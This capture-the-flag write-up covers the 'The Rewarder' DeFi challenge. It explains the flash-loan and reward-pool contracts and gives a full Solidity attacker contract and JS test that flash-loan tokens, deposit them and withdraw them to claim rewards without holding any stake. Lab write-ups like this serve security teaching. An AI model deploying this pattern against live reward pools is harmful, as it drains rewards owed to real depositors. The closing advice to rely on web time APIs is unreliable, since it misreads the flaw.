# The-Rewarder

## Introduction
The goal of this box is to get rewards out of the rewarder pool without depositing a single token.

## Code Breakdown
To do so, we'll have to look at the following contracts

***FlashLoanerPool.sol***.

Let's start by looking at the important functions.

**function flashLoan(uint256 amount) external nonRentrant**

Like any other flash loan function, it requires the sender to be a **contract** and the contract must have a function **receiveFlashLoan(uint256)**

Why does your attacker contract requires **receiveFlashLoan (uint256)**?
In the **flashLoan** function, it calls for it explicity.
```
msg.sender.functionCall(
    abi.encodeWithSignature(
        "receiveFlashLoan(uint256)",
        amount
    )
);
```

The next contract we'll be looking at is ***TheRewarderPool.sol***

Let's start by looking at the important functions.

***function deposit(uint256 amountToDeposit) external***

This is a simple function where users will deposit their tokens.
It'll call for a **distributeRewards()** whenever a deposit is made to check if it's time for reward distribution.

***function withdraw(uint256 amountToWithdraw) external***

This is a function where user can withdraw their token

***function distributeRewards() public returns (uint256)***

This function will check for distribute the reward evenly among the depositers according to contributions.

***function isNewRewardsRound() public view returns (bool)***

To check if a new round is issued every 5 days.


## Hints
There are 2 variables to consider - Ensure new round has started, Flashloan, deposit and steal rewards under the same contract.

Here's the thought process when you're crafting the attacker contract

1) Send a command to the block to fast forward time by 5 days
2) Flashloan the tokens, deposit them, withdraw and return the tokens within the same function.
3) Transfer the reward tokens to the attacker address


## Solutions
Following the hints above, your smart contract should look similar to this.
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";
import "./AccountingToken.sol";

/**
 * @title Attacker
 * @author BingleBangle-BH
 */

 contract Attacker {

    using Address for address payable;

    address payable private pool;

    FlashLoanerPool public flash_pool;
    TheRewarderPool public reward_pool;
    RewardToken public reward_token;
    DamnValuableToken public liquidity_token;

    constructor(address _flash_pool, address _reward_pool, address _reward_token, address _tokenAddress) {
        flash_pool = FlashLoanerPool(_flash_pool);
        reward_pool = TheRewarderPool(_reward_pool);
        reward_token = RewardToken(_reward_token);
        liquidity_token = DamnValuableToken(_tokenAddress);
    }

    function receiveFlashLoan(uint256 amount) public payable {
        liquidity_token.approve(address(reward_pool), amount);
        reward_pool.deposit(amount);
        reward_pool.withdraw(amount);
        liquidity_token.transfer(address(flash_pool), amount);
    }

    function stealRewards() external{
        uint256 dvtPoolBalance = liquidity_token.balanceOf(address(flash_pool));
        flash_pool.flashLoan(dvtPoolBalance);
        reward_token.transfer(msg.sender, reward_token.balanceOf(address(this)));
    }

 }
```

Here's the javascript
```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Advance time 5 days so that depositors can get rewards
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); 
    
    //Deploy attacker contract
    const attacker_pool = await ethers.getContractFactory('Attacker', attacker);
    this.attack = await attacker_pool.deploy(this.flashLoanPool.address, 
                                        this.rewarderPool.address,
                                        this.rewardToken.address, 
                                        this.liquidityToken.address);
    await this.attack.stealRewards();
    
    balance = await this.rewardToken.balanceOf(attacker.address);
    console.log(balance.toString());
});
```

## Recommendations
Do not use **block.timestamp** or **block.number** as an indicator to manage the number of rounds or time in your contract. Consider using external oracle service that provides time information such as Chainlink, TimezoneDB or WorldClockAPI.